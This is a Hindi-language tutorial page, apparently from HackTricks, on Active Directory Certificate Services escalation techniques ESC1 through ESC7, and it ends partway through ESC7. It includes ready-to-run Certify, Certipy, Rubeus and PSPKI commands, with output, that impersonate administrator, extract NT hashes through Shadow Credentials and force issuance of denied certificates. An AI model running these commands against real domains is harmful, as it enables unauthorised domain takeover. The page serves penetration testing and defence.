# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**यह posts के escalation technique sections का सारांश है:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## गलत कॉन्फ़िगर किए गए Certificate Templates - ESC1

### व्याख्या

### गलत कॉन्फ़िगर किए गए Certificate Templates - ESC1 की व्याख्या

- **Enterprise CA द्वारा कम-विशेषाधिकार वाले users को Enrolment rights दिए गए हैं।**
- **Manager approval आवश्यक नहीं है।**
- **अधिकृत कर्मचारियों के signatures की आवश्यकता नहीं है।**
- **Certificate templates पर Security descriptors अत्यधिक अनुमतिपूर्ण हैं, जिससे कम-विशेषाधिकार वाले users को Enrolment rights मिल सकते हैं।**
- **Certificate templates को ऐसे EKUs परिभाषित करने के लिए कॉन्फ़िगर किया गया है जो authentication को सक्षम करते हैं:**
  - Extended Key Usage (EKU) identifiers, जैसे Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), या कोई EKU नहीं (SubCA), शामिल हैं।
- **Template द्वारा requesters को Certificate Signing Request (CSR) में subjectAltName शामिल करने की अनुमति है:**
  - यदि certificate में subjectAltName (SAN) मौजूद हो, तो Active Directory (AD) identity verification के लिए उसे प्राथमिकता देता है। इसका अर्थ है कि CSR में SAN निर्दिष्ट करके किसी भी user (जैसे, domain administrator) का रूप धारण करने के लिए certificate का अनुरोध किया जा सकता है। Requester SAN निर्दिष्ट कर सकता है या नहीं, यह certificate template के AD object में `mspki-certificate-name-flag` property से पता चलता है। यह property एक bitmask है, और `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag मौजूद होने पर requester SAN निर्दिष्ट कर सकता है।

> [!CAUTION]
> ये settings ESC1 template candidate की पहचान करती हैं, न कि impersonation का पूरा रास्ता। जाँचें कि target principal उस CA पर enroll कर सकता है जो template प्रकाशित करता है, CA enrollment की अनुमति है, और जारी किया गया certificate authentication endpoint के strong SID mapping rules को पूरा करता है। वर्तमान patched KDCs अनुरोधित UPN को अस्वीकार कर सकते हैं यदि certificate का SID target से मेल नहीं खाता; देखें [Microsoft's certificate mapping guidance](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

**Domain Computers** को दिए गए Enrollment rights के कारण staged computer identity पात्र हो सकती है, भले ही मूल user enroll न कर सके। Computer principal के rights का अलग से आकलन करें। अनुरोध करने से पहले `msPKI-Minimal-Key-Size` जाँचें: 4096-bit RSA keys की आवश्यकता वाला template, client की 2048-bit default key को अस्वीकार कर देगा। अनुरोध में दिया गया target SID SID mismatch को तभी दूर कर सकता है जब CA और KDC उससे बना certificate और mapping स्वीकार करें; template flags या अकेला Enroll ACE इसका प्रमाण नहीं है।

यह feature कभी-कभी products या deployment services द्वारा HTTPS या host certificates को on-the-fly generate करने के लिए सक्षम किया जाता है, या समझ की कमी के कारण।

ध्यान दें कि इस विकल्प से certificate बनाने पर warning दिखाई देती है। लेकिन किसी मौजूदा certificate template (जैसे `WebServer` template, जिसमें `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` सक्षम है) को duplicate करके authentication OID शामिल करने के लिए संशोधित करने पर ऐसा नहीं होता।<sup>[[6]](#references)</sup>

### दुरुपयोग

**vulnerable certificate templates खोजने** के लिए आप यह चला सकते हैं:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

**इस vulnerability का दुरुपयोग करके administrator का रूप धारण करने के लिए** कोई यह चला सकता है:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

फिर आप जनरेट किए गए **certificate को `.pfx`** फ़ॉर्मैट में बदल सकते हैं और इसका उपयोग करके **Rubeus या certipy से फिर से authenticate** कर सकते हैं:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Windows बाइनरी "Certreq.exe" और "Certutil.exe" का उपयोग PFX जनरेट करने के लिए किया जा सकता है: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest के configuration schema में certificate templates की enumeration—विशेष रूप से वे templates जिनमें approval या signatures की आवश्यकता नहीं होती, जिनमें Client Authentication या Smart Card Logon EKU होता है, और जिनमें `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag enabled होता है—निम्नलिखित LDAP query चलाकर की जा सकती है:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## गलत कॉन्फ़िगर किए गए Certificate Templates - ESC2

### स्पष्टीकरण

दूसरा दुरुपयोग परिदृश्य पहले परिदृश्य का एक रूपांतर है:

1. Enterprise CA द्वारा कम-विशेषाधिकार वाले उपयोगकर्ताओं को Enrollment अधिकार दिए जाते हैं।
2. Manager approval की आवश्यकता अक्षम होती है।
3. अधिकृत signatures की आवश्यकता हटा दी जाती है।
4. Certificate template पर अत्यधिक अनुमतिपूर्ण security descriptor, कम-विशेषाधिकार वाले उपयोगकर्ताओं को certificate enrollment अधिकार देता है।
5. **Certificate template में Any Purpose EKU या कोई EKU शामिल नहीं होता है।**

**Any Purpose EKU** हमलावर को **किसी भी उद्देश्य** के लिए certificate प्राप्त करने की अनुमति देता है, जिसमें client authentication, server authentication, code signing आदि शामिल हैं। इस परिदृश्य का फायदा उठाने के लिए **ESC3 के लिए इस्तेमाल की गई वही technique** अपनाई जा सकती है।

**कोई EKU नहीं** वाले certificates, जो subordinate CA certificates के रूप में काम करते हैं, **किसी भी उद्देश्य** के लिए इस्तेमाल किए जा सकते हैं और **नए certificates पर हस्ताक्षर करने के लिए भी इस्तेमाल किए जा सकते हैं**। इसलिए, हमलावर subordinate CA certificate का उपयोग करके नए certificates में मनचाहे EKUs या fields निर्दिष्ट कर सकता है।

हालाँकि, **domain authentication** के लिए बनाए गए नए certificates काम नहीं करेंगे, यदि subordinate CA पर **`NTAuthCertificates`** object द्वारा भरोसा नहीं किया जाता है, जो कि default setting है। फिर भी, हमलावर **किसी भी EKU** और मनचाहे certificate values वाले **नए certificates बना** सकता है। इनका संभावित रूप से कई उद्देश्यों (जैसे code signing, server authentication आदि) के लिए **दुरुपयोग** किया जा सकता है और इनके नेटवर्क में SAML, AD FS या IPSec जैसे अन्य applications पर गंभीर प्रभाव पड़ सकते हैं।<sup>[[6]](#references)</sup>

AD Forest के configuration schema में इस परिदृश्य से मेल खाने वाले templates की गणना करने के लिए, निम्न LDAP query चलाई जा सकती है:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## गलत कॉन्फ़िगर किए गए Enrollment Agent Templates - ESC3

### विवरण

यह परिदृश्य पहले और दूसरे परिदृश्य जैसा है, लेकिन इसमें **एक अलग EKU** (Certificate Request Agent) का **दुरुपयोग** किया जाता है और **2 अलग-अलग templates** इस्तेमाल होते हैं (इसलिए इसकी आवश्यकताओं के 2 सेट हैं)।

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), जिसे Microsoft के दस्तावेज़ों में **Enrollment Agent** कहा जाता है, किसी principal को **दूसरे user की ओर से certificate के लिए enroll** करने की अनुमति देता है।

**“Enrollment agent”** ऐसे **template** में enroll करता है और प्राप्त **certificate का इस्तेमाल दूसरे user की ओर से CSR पर co-sign करने के लिए करता है**। फिर वह **co-signed CSR को CA को भेजता है** और ऐसे **template** में enroll करता है जो **“enroll on behalf of” की अनुमति देता है**। इसके बाद CA **“दूसरे” user से संबंधित certificate** जारी करता है।<sup>[[6]](#references)</sup>

**आवश्यकताएँ 1:**

- Enterprise CA द्वारा कम विशेषाधिकार वाले users को enrollment अधिकार दिए गए हों।
- Manager approval की आवश्यकता न हो।
- Authorized signatures की कोई आवश्यकता न हो।
- Certificate template का security descriptor अत्यधिक permissive हो और कम विशेषाधिकार वाले users को enrollment अधिकार देता हो।
- Certificate template में Certificate Request Agent EKU शामिल हो, जिससे दूसरे principals की ओर से अन्य certificate templates के लिए request की जा सके।

**आवश्यकताएँ 2:**

- Enterprise CA कम विशेषाधिकार वाले users को enrollment अधिकार देता हो।
- Manager approval को bypass किया गया हो।
- Version 1 target template, नए granular issuance-policy controls के बिना भी enrollment agent स्वीकार कर सकता है; version 2 या नए version के लिए, केवल version के आधार पर template को बाहर करने के बजाय उसकी application-policy issuance requirements और authorized signatures की जाँच करें।
- Certificate template में परिभाषित EKU domain authentication की अनुमति देता हो।
- CA पर enrollment agents के लिए प्रतिबंध लागू न हों।

चुने गए CA द्वारा target template प्रकाशित भी होना चाहिए, target account को enroll करने की अनुमति देनी चाहिए और इच्छित domain-authentication उपयोग का समर्थन करना चाहिए। उस account के लिए आवश्यक subject/SAN attributes जाँचें; उदाहरण के लिए, AD से subject email लेने वाला template ऐसे account के लिए certificate जारी नहीं कर सकता जिसमें आवश्यक `mail` value न हो। केवल agent certificate होना इन target-template शर्तों को पूरा नहीं करता।

### दुरुपयोग

इस परिदृश्य का दुरुपयोग करने के लिए [**Certify**](https://github.com/GhostPack/Certify) या [**Certipy**](https://github.com/ly4k/Certipy) का इस्तेमाल किया जा सकता है:<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

**उपयोगकर्ता** जिन्हें **enrollment agent certificate प्राप्त करने** की अनुमति है, वे templates जिनमें enrollment **agents** को enroll करने की अनुमति है, और वे **accounts** जिनकी ओर से enrollment agent कार्य कर सकता है—इन पर enterprise CAs प्रतिबंध लगा सकते हैं। ऐसा करने के लिए `certsrc.msc` **snap-in** खोलें, **CA पर right-click करें**, **Properties पर क्लिक करें**, और फिर “Enrollment Agents” टैब पर **जाएँ**।

हालाँकि, ध्यान दें कि CAs की **default** setting “**Do not restrict enrollment agents**” होती है। जब administrators enrollment agents पर प्रतिबंध सक्षम करके इसे “Restrict enrollment agents” पर सेट करते हैं, तब भी default configuration अत्यंत permissive रहती है। यह **Everyone** को किसी के रूप में भी सभी templates में enroll करने की अनुमति देती है।

### Certi-Bhai के साथ केवल Windows पर चलने वाले PowerShell PoCs

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) Certify या Certipy के बिना ESC1 और ESC2/ESC3 को आज़माता है। इसकी scripts `X509Enrollment` COM API से exportable 2048-bit RSA key बनाती हैं, PKCS#10 request तैयार करती हैं, LDAP के ज़रिए पहला `pKIEnrollmentService` ढूँढ़ती हैं, `CertificateAuthority.Request` के ज़रिए उसे submit करती हैं, response को `Cert:\CurrentUser\My` में install करती हैं, और Base64-encoded PFX export करती हैं। ESC1 script attacker द्वारा चुना गया UPN SAN (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, value `0xb`) जोड़ती है, जबकि ESC2/ESC3 scripts पहली certificate का उपयोग करके on-behalf-of request पर हस्ताक्षर करने वाला PKCS#7 बनाती हैं।<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

स्क्रिप्ट PFX का Base64 प्रिंट करती हैं, जिसमें private key शामिल होती है, ताकि इसे सीधे Rubeus के साथ इस्तेमाल किया जा सके। इसे `[Convert]::ToBase64String($cert.RawData)` से न बदलें: `RawData` केवल public certificate को encode करता है और PKINIT request पर हस्ताक्षर नहीं कर सकता।<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## असुरक्षित सर्टिफिकेट टेम्पलेट एक्सेस कंट्रोल - ESC4

### **व्याख्या**

**सर्टिफिकेट टेम्पलेट्स** पर मौजूद **security descriptor**, टेम्पलेट के संबंध में विशिष्ट **AD principals** के पास मौजूद **permissions** निर्धारित करता है।

यदि किसी **attacker** के पास किसी **template** को **बदलने** और **पिछले sections** में बताए गए कोई भी **exploit किए जा सकने वाले misconfigurations** लागू करने के लिए आवश्यक **permissions** हों, तो privilege escalation संभव हो सकता है।

सर्टिफिकेट टेम्पलेट्स पर लागू होने वाली उल्लेखनीय permissions में शामिल हैं:<sup>[[6]](#references)</sup>

- **Owner:** ऑब्जेक्ट पर निहित नियंत्रण देता है, जिससे किसी भी attribute को बदला जा सकता है।
- **FullControl:** ऑब्जेक्ट पर पूर्ण अधिकार देता है, जिसमें किसी भी attribute को बदलने की क्षमता शामिल है।
- **WriteOwner:** ऑब्जेक्ट के owner को attacker के नियंत्रण वाले principal में बदलने की अनुमति देता है।
- **WriteDacl:** access controls में बदलाव की अनुमति देता है, जिससे attacker को FullControl मिल सकता है।
- **WriteProperty:** ऑब्जेक्ट की किसी भी property को संपादित करने की अनुमति देता है।

`CN=Certificate Templates,CN=Public Key Services,CN=Services,...` container पर DACL भी जाँचें। [`pKICertificateTemplate` class](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c) तक सीमित लागू `CreateChild` ACE, या व्यापक full control, नया template object बनाने का संभावित रास्ता है। [Microsoft का दस्तावेज़](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44) बताता है कि इस container में ये template objects होते हैं। यह तय करने से पहले कि creation प्रभावी होगा या नहीं, मेल खाने वाले deny ACEs और inheritance की जाँच करें। केवल template बनाने से certificate जारी नहीं होता: CA को उसे publish करना होगा, अनुरोध करने वाले principal के पास enrollment access होना चाहिए, और authentication endpoint पर certificate को इच्छित identity से map होना चाहिए।

### दुरुपयोग

Templates और अन्य PKI objects पर edit rights वाले principals की पहचान करने के लिए, Certify से enumerate करें:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

एक privesc का उदाहरण, पिछले उदाहरण जैसा:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 तब होता है जब किसी यूज़र के पास certificate template पर write privileges हों। उदाहरण के लिए, इसका दुरुपयोग certificate template का configuration बदलकर उसे ESC1 के प्रति vulnerable बनाने के लिए किया जा सकता है।

ऐसा template जो enrollee को subject देने देता है, लेकिन जिसका उपयोग केवल Server Authentication के लिए है, अपने-आप में user-logon template नहीं होता। Template पर प्रभावी नियंत्रण-अधिकार मिलने पर, attacker certificate माँगने से पहले उसके authentication EKUs या application policies बदल सकता है; [Microsoft, Smartcard Logon EKU के sign-in उद्देश्य का दस्तावेज़ देता है](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts)। पुष्टि करें कि CA संशोधित template प्रकाशित करता है, requester enroll कर सकता है, approval/signature की आवश्यकताएँ पूरी होती हैं, और जारी किया गया certificate इच्छित account से map होता है। खास तौर पर, [Full Enforcement में patched domain controllers](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) strong mapping के बिना certificates अस्वीकार करते हैं; request में target UPN जोड़ने से यह आवश्यकता bypass नहीं होती।

जैसा कि ऊपर के path में हम देख सकते हैं, केवल `JOHNPC` के पास ये privileges हैं, लेकिन हमारे यूज़र `JOHN` के पास `JOHNPC` से जुड़ा नया `AddKeyCredentialLink` edge है। चूँकि यह technique certificates से संबंधित है, इसलिए मैंने इस attack को भी लागू किया है, जिसे [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) के नाम से जाना जाता है।<sup>[[8]](#references)</sup> यहाँ Certipy के `shadow auto` command की एक छोटी-सी झलक है, जो victim का NT hash निकालता है।

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** एक ही command से certificate template की configuration को overwrite कर सकता है। **डिफ़ॉल्ट रूप से**, Certipy configuration को **ESC1 के प्रति vulnerable बनाने के लिए overwrite** करेगा। हम **पुरानी configuration को save करने के लिए `-save-old` parameter** भी specify कर सकते हैं, जो हमारे attack के बाद configuration को **restore** करने में उपयोगी होगा।

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## असुरक्षित PKI Object Access Control - ESC5

### व्याख्या

आपस में जुड़े ACL-आधारित संबंधों का व्यापक जाल, जिसमें certificate templates और certificate authority के अलावा कई अन्य objects भी शामिल हैं, पूरे AD CS सिस्टम की सुरक्षा को प्रभावित कर सकता है। सुरक्षा पर महत्वपूर्ण प्रभाव डाल सकने वाले इन objects में शामिल हैं:

- CA server का AD computer object, जिसे S4U2Self या S4U2Proxy जैसे तरीकों से compromise किया जा सकता है।
- CA server का RPC/DCOM server।
- विशिष्ट container path `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` में मौजूद कोई भी descendant AD object या container। इस path में Certificate Templates container, Certification Authorities container, NTAuthCertificates object और Enrollment Services Container जैसे containers और objects शामिल हैं, लेकिन यह सूची इन्हीं तक सीमित नहीं है।

यदि कम विशेषाधिकार वाला attacker इनमें से किसी भी महत्वपूर्ण घटक पर नियंत्रण हासिल कर लेता है, तो PKI सिस्टम की सुरक्षा compromise हो सकती है।<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### व्याख्या

[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) में चर्चा किया गया विषय Microsoft द्वारा बताए गए **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag के प्रभावों को भी छूता है। Certification Authority (CA) पर सक्रिय होने पर, यह configuration **किसी भी request** के **subject alternative name** में **user-defined values** शामिल करने की अनुमति देता है—इसमें Active Directory® से बनाई गई requests भी शामिल हैं। नतीजतन, यह प्रावधान **intruder** को **domain authentication** के लिए configured **किसी भी template** के माध्यम से enroll करने देता है—विशेष रूप से उन templates के माध्यम से जो **unprivileged** users को enrollment की अनुमति देते हैं, जैसे कि standard User template। इसके परिणामस्वरूप, certificate प्राप्त किया जा सकता है, जिससे intruder domain administrator या domain में मौजूद **किसी भी अन्य सक्रिय entity** के रूप में authenticate कर सकता है।<sup>[[9]](#references)</sup>

**ध्यान दें**: `certreq.exe` में `-attrib "SAN:"` argument के ज़रिए Certificate Signing Request (CSR) में **alternative names** जोड़ने का तरीका (“Name Value Pairs” के रूप में संदर्भित), ESC1 में SANs के exploitation की रणनीति से **अलग** है। यहाँ अंतर **account information को कैसे शामिल किया जाता है** इसमें है—certificate extension के बजाय certificate attribute में।

### दुरुपयोग

यह जाँचने के लिए कि setting सक्रिय है या नहीं, संगठन `certutil.exe` के साथ निम्न command का उपयोग कर सकते हैं:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

यह ऑपरेशन मूलतः **remote registry access** का उपयोग करता है, इसलिए एक वैकल्पिक तरीका यह हो सकता है:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

[**Certify**](https://github.com/GhostPack/Certify) और [**Certipy**](https://github.com/ly4k/Certipy) जैसे टूल इस गलत कॉन्फ़िगरेशन का पता लगाने और इसका फायदा उठाने में सक्षम हैं:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

इन settings को बदलने के लिए, यदि आपके पास **domain administrative** अधिकार या समकक्ष अधिकार हैं, तो निम्न command किसी भी workstation से चलाया जा सकता है:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

अपने environment में इस configuration को disable करने के लिए, flag हटाया जा सकता है:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> मई 2022 के सुरक्षा अपडेट के बाद जारी किए गए नए **certificates** में एक **security extension** होगा, जिसमें **requester की `objectSid` property** शामिल होती है। ESC1 के लिए, यह SID निर्दिष्ट SAN से प्राप्त होता है। हालांकि, **ESC6** के लिए, SID SAN के बजाय **requester के `objectSid`** को दर्शाता है।\
> ESC6 का exploit करने के लिए, सिस्टम का ESC10 (Weak Certificate Mappings) के प्रति संवेदनशील होना आवश्यक है, जो **नई security extension के बजाय SAN को प्राथमिकता देता है**।

## Vulnerable Certificate Authority Access Control - ESC7

### हमला 1

#### व्याख्या

Certificate authority का access control अनुमतियों के एक सेट के ज़रिए बनाए रखा जाता है, जो CA की कार्रवाइयों को नियंत्रित करती हैं। इन अनुमतियों को `certsrv.msc` खोलकर, CA पर राइट-क्लिक करके, Properties चुनकर और फिर Security टैब पर जाकर देखा जा सकता है। इसके अलावा, PSPKI module का उपयोग करके निम्न जैसे commands से अनुमतियों की enumeration की जा सकती है:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

यह प्राथमिक अधिकारों, अर्थात् **`ManageCA`** और **`ManageCertificates`**, के बारे में जानकारी देता है, जो क्रमशः “CA administrator” और “Certificate Manager” की भूमिकाओं से संबंधित हैं।<sup>[[6]](#references)</sup>

#### दुरुपयोग

Certificate authority पर **`ManageCA`** अधिकार होने से principal, PSPKI का उपयोग करके दूरस्थ रूप से सेटिंग्स में बदलाव कर सकता है। इसमें किसी भी template में SAN निर्दिष्ट करने की अनुमति देने के लिए **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag को टॉगल करना शामिल है, जो domain escalation का एक महत्वपूर्ण पहलू है।

PSPKI के **Enable-PolicyModuleFlag** cmdlet का उपयोग करके इस प्रक्रिया को सरल बनाया जा सकता है, जिससे सीधे GUI के साथ इंटरैक्ट किए बिना बदलाव किए जा सकते हैं।

**`ManageCertificates`** अधिकार होने से लंबित अनुरोधों को मंज़ूरी दी जा सकती है, जिससे “CA certificate manager approval” सुरक्षा उपाय को प्रभावी ढंग से दरकिनार किया जा सकता है।

Certificate का अनुरोध करने, उसे मंज़ूरी देने और डाउनलोड करने के लिए **Certify** और **PSPKI** modules के संयोजन का उपयोग किया जा सकता है:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Attack 2

#### Explanation

> [!WARNING]
> **पिछले attack** में **ESC6 attack** करने के लिए **EDITF_ATTRIBUTESUBJECTALTNAME2** flag को **enable** करने हेतु **`Manage CA`** permissions का इस्तेमाल किया गया था, लेकिन CA service (`CertSvc`) के restart होने तक इसका कोई असर नहीं होगा। जब किसी user के पास `Manage CA` access right होता है, तो उसे **service restart करने** की भी अनुमति होती है। हालांकि, इसका **यह मतलब नहीं है कि user service को remotely restart कर सकता है**। इसके अलावा, May 2022 security updates के कारण, अधिकांश patched environments में **ESC6 शायद बिना किसी अतिरिक्त बदलाव के काम न करे**।

इसलिए, यहां एक और attack प्रस्तुत किया गया है।

Prerequisites:

- केवल **`ManageCA` permission**
- **`Manage Certificates`** permission (इसे **`ManageCA`** से grant किया जा सकता है)
- Certificate template **`SubCA`** **enabled** होना चाहिए (इसे **`ManageCA`** से enable किया जा सकता है)

यह technique इस तथ्य पर निर्भर करती है कि `Manage CA` _और_ `Manage Certificates` access right वाले users **असफल certificate requests जारी कर सकते हैं**। **`SubCA`** certificate template **ESC1 के प्रति vulnerable** है, लेकिन template में enroll केवल **administrators** ही कर सकते हैं। इसलिए, कोई **user** **`SubCA`** में enroll करने का **request** कर सकता है—जिसे **deny** कर दिया जाएगा—लेकिन **बाद में manager उसे जारी कर देगा**।<sup>[[6]](#references)</sup>

#### Abuse

आप खुद को नया officer जोड़कर **`Manage Certificates`** access right **grant कर सकते हैं**।

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

**`SubCA`** टेम्पलेट को `-enable-template` पैरामीटर के साथ **CA पर सक्षम किया जा सकता है**। डिफ़ॉल्ट रूप से, `SubCA` टेम्पलेट सक्षम होता है।

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

यदि हमने इस हमले के लिए आवश्यक शर्तें पूरी कर ली हैं, तो हम **`SubCA` template के आधार पर certificate का अनुरोध** करके शुरुआत कर सकते हैं।

**यह अनुरोध अस्वीकार कर दिया जाएगा**, लेकिन हम private key सहेज लेंगे और request ID नोट कर लेंगे।

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

हमारे **`Manage CA` और `Manage Certificates`** के साथ, हम `ca` command और `-issue-request <request ID>` parameter का उपयोग करके **असफल certificate request जारी** कर सकते हैं।

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

और अंत में, हम `req` command और `-retrieve <request ID>` parameter का इस्तेमाल करके **जारी किया गया certificate प्राप्त कर सकते हैं**।

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
